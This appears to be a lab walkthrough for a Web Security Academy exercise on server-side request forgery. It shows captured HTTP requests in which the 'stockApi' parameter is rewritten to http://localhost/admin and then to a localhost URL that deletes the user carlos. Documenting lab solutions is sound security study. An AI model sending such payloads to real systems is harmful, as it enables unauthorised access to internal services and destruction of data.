https://0a46004a049fa31d80b13a1a004600c0.web-security-academy.net/product?productId=1

Let's inspect the "Check stock" function:

![](_attachment/Pasted%20image%2020250326082005.png)

```http
POST /product/stock HTTP/2
Host: 0a46004a049fa31d80b13a1a004600c0.web-security-academy.net
Cookie: session=T4qmni5r0LJUiFFpmwsch92IV53LDjpa
Content-Length: 107
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: it-IT,it;q=0.9
Sec-Ch-Ua: "Not:A-Brand";v="24", "Chromium";v="134"
Content-Type: application/x-www-form-urlencoded
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: */*
Origin: https://0a46004a049fa31d80b13a1a004600c0.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a46004a049fa31d80b13a1a004600c0.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D2
```


there is a call to `stockApi..`

let's change to `http://localhost/admin`

```http
POST /product/stock HTTP/2
Host: 0a46004a049fa31d80b13a1a004600c0.web-security-academy.net
Cookie: session=T4qmni5r0LJUiFFpmwsch92IV53LDjpa
Content-Length: 31
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: it-IT,it;q=0.9
Sec-Ch-Ua: "Not:A-Brand";v="24", "Chromium";v="134"
Content-Type: application/x-www-form-urlencoded
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: */*
Origin: https://0a46004a049fa31d80b13a1a004600c0.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a46004a049fa31d80b13a1a004600c0.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

stockApi=http://localhost/admin
```

we get a valid response:

![](_attachment/Pasted%20image%2020250326082254.png)

simply as that:

```http
POST /product/stock HTTP/2
Host: 0a46004a049fa31d80b13a1a004600c0.web-security-academy.net
Cookie: session=T4qmni5r0LJUiFFpmwsch92IV53LDjpa
Content-Length: 31
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: it-IT,it;q=0.9
Sec-Ch-Ua: "Not:A-Brand";v="24", "Chromium";v="134"
Content-Type: application/x-www-form-urlencoded
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: */*
Origin: https://0a46004a049fa31d80b13a1a004600c0.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a46004a049fa31d80b13a1a004600c0.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

stockApi=http://localhost/admin/delete?username=carlos
```

![](_attachment/Pasted%20image%2020250326082348.png)

